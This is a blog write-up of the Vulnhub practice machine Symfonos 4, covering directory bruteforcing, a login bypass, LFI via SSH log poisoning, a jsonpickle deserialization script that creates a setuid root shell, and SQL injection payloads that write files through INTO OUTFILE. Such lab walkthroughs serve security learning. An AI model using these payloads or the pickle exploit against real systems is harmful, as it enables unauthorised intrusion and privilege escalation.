+++
title = "Vulnhub: Symfonos 4"
date = "2021-02-15"
author = ""
authorTwitter = "" #do not include @
cover = ""
tags = ["Intermediate", "Vulnhub", "OSCP Prep", "ffuf", "Directory Bruteforce", "LFI", "Pickle", "Deserialization", "SQLi"]
keywords = ["", ""]
description = ""
showFullContent = false
+++

<!--more-->
{{< image src="/img/symfonos1/symfonos1.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

| Difficulty | Release Date | Author | Machine link |
| ---------- | ------------ | ------ | ------- |
| Intermediate | 20 Aug 2019   | Zayotic | https://vulnhub.com/entry/symfonos-4,347/ |

# Summary

For this box, some directory bruteforce is needed to discover some php files. One of the php files has an lfi
vulnerability but can only be access by authenticating to the other page. The login form can be bypassed and
we exploit the lfi. For that we poison ssh logs for exploitation to rce. For privilege escalation we exploit
a python web app running locally as root using insecure deserialization of the cookie by jsonpickle.

# Reconnaissance

Nmap

```sh
Nmap scan report for 192.168.56.105
Host is up (0.00033s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey:
|   2048 f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f (RSA)
|   256 be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 (ECDSA)
|_  256 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Enumeration

## HTTP (80)

On the browser, the only thing that is served is an image. Therefore we need to bruteforce for directories
and files.

{{< image src="/img/symfonos4/symfonos4-26.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Performing a bruteforce with ffuf we get a **gods** directory.

```sh
ffuf -ic -c -u http://192.168.56.105/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e / -fc 403 | tee root.ffuf
```

{{< image src="/img/symfonos4/symfonos4-2.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

In this directory we only have some files, with nothing useful in them.

{{< image src="/img/symfonos4/symfonos4-1.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

The contents:

{{< image src="/img/symfonos4/symfonos4-3.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

I decided to use the contents of the files to generate a wordlist for more bruteforce using curl.

{{< image src="/img/symfonos4/symfonos4-4.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

With this new words I performed bruteforce again but adding extensions.

{{< image src="/img/symfonos4/symfonos4-6.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

From this we discover **sea.php** .

When we try to visit this file, we get redirected to atlantis.php which has a login form.

{{< image src="/img/symfonos4/symfonos4-7.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

On this form if we submit random creds, then visit sea.php afterwards. We are able to access it. I think this 
behaviour is related to the cookies the app sends after trying to login. 

The sea.php has form that loads files based on the god we select. The contents are the log files we discovered
in /gods. Based on this behaviour we can try and exploit lfi to get rce.

{{< image src="/img/symfonos4/symfonos4-10.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Since the on the url we are passing hades, and it loads content of hades.log. We can assume it appends .log
to our input. This restricts us to only loading log files, but that should be sufficient for lfi to rce.

After testing a few log files I could only access auth.log which is located in /var/log/auth.log. These are ssh logs.

# Getting shell as www-data

Let's poison the ssh log by add php code in the username for rce.

{{< image src="/img/symfonos4/symfonos4-12.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

We can pass the command id to test if we were successful. 

{{< image src="/img/symfonos4/symfonos4-13.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

In the response we have www-data output. Now we can send our reverse shell payload.

{{< image src="/img/symfonos4/symfonos4-14.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Shell:

{{< image src="/img/symfonos4/symfonos4-15.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

In the webroot we can read atlantis.php that had the login form and here we get db creds.

{{< image src="/img/symfonos4/symfonos4-16.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

The discovered password is also the password for the poseidon user.

{{< image src="/img/symfonos4/symfonos4-17.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

# Privilege Escalation

Performing some manual enumeration locally for privesc paths, I took a look at local listening services. I
discovered port 8080 which I used ssh portforwarding to access from my host.

{{< image src="/img/symfonos4/symfonos4-19.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

A simple web app is running.

{{< image src="/img/symfonos4/symfonos4-18.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Looking back at running processes, this appears to be a python app which is running as root. Looks like this is our
path to privesc.

{{< image src="/img/symfonos4/symfonos4-21.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

In /opt I found the source code:

{{< image src="/img/symfonos4/symfonos4-20.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Based on the use of pickle, we need to exploit deserialization through the cookie.

I came up with the below script to generate a base64 encoded cookie which when deserialized
will create a setuid binary of bash.

```py
import jsonpickle
import base64
import os

class RCE(object):
    def __reduce__(self):
        cmd = ('cp /bin/bash /tmp/suidbash;chmod +s /tmp/suidbash')
        return os.system, (cmd,)

encoded = base64.b64encode(jsonpickle.encode(RCE()))
print(encoded)
```

{{< image src="/img/symfonos4/symfonos4-22.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Setting the cookie and sending the request using burpsuite:

{{< image src="/img/symfonos4/symfonos4-23.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

We get suidbash

{{< image src="/img/symfonos4/symfonos4-24.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

And we finally get a root shell:

{{< image src="/img/symfonos4/symfonos4-25.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

# Extras
 
## Checking the redirect on accessing the sea.php. 

The code on sea.php only checks if the session isset but not what value it is set to. From atlantis.php when you send wrong creds,
the `$_SESSION['logged_in']` is set to false. 

{{< image src="/img/symfonos4/symfonos4-27.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

## SQL Injection on atlantis.php login form.

When you supply username `admin' or 1=1-- -` and a random password we get a redirect to sea.php but with 
`admin' and 1=2-- -` we get a incorrect login.

This is a blind boolean sql injection. We can intercept the request with burpsuite and save the request to file 
and exploit this with sqlmap.

{{< image src="/img/symfonos4/symfonos4-28.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

```sh
sqlmap -r atlantis.req --batch --dump --level=5 --risk=3 --threads=5
```
I was able to dump creds but they weren't useful as I couldn't crack the hash.

{{< image src="/img/symfonos4/symfonos4-11.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Since we can run sql queries, we can try and write to a file and access it using the lfi. During exploiting of this box
I tried this but couldn't figure out why it failed but on revisiting it afterwards I figured out the issue.

Using this payload in my post request to write to a file using select, we don't get the usual redirect that
signifies that the query was successful.

```
username=admin' and 1=2 Union Select 1,'2' INTO OUTFILE '/tmp/test.log'-- -&password=a
```

{{< image src="/img/symfonos4/symfonos4-29.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

The file is actually written to disk if we check the /tmp folder.

{{< image src="/img/symfonos4/symfonos4-30.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

The reason that we don't get a redirect is that no rows are returned by the query when writing files therefore 
the php code returns a false and doesn't redirect to sea.php.

{{< image src="/img/symfonos4/symfonos4-31.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Now if we try to include the test.log in /tmp using the lfi, it fails. The reason for this is because some services are
configured to have a private tmp folder which isn't the same as the usual /tmp. The below answer I found explains this.

{{< image src="/img/symfonos4/symfonos4-32.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

If you look at the previous screenshot you'll notice the folders beginning with systemd-private and one of those seem to
belong to apache2.

With this knowledge, we need to use other directories to write files in. Since we are exploiting sql injection for this,
we need folders that the mysql user can write. I discovered /var/lib/mysql and /dev/shm are suitable for this. 

Something else to note is that if a file exists, sql will not overwrite it. Therefore if you need to make changes to 
what you're writing you'll need to write to another non-existent file.

Testing this using /var/lib/mysql the file gets written.

```
username=admin' and 1=2 Union Select 1,'test' INTO OUTFILE '/var/lib/mysql/123456.log'-- -&password=a
```

{{< image src="/img/symfonos4/symfonos4-33.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Then accessing it using the lfi works this time.

{{< image src="/img/symfonos4/symfonos4-34.png" alt="symfonos" position="center" style="border-radius: 8px;" >}}

Something else also to note is that the db user in this case is the mysql root user.
 
